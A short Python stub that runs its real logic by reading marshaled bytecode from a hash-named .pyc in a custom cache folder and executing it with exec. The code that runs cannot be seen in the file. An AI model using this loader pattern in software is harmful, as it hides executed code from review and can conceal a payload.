
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'use_case_unit_e8571116b8b44e7a85abb3f011b27fd5.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
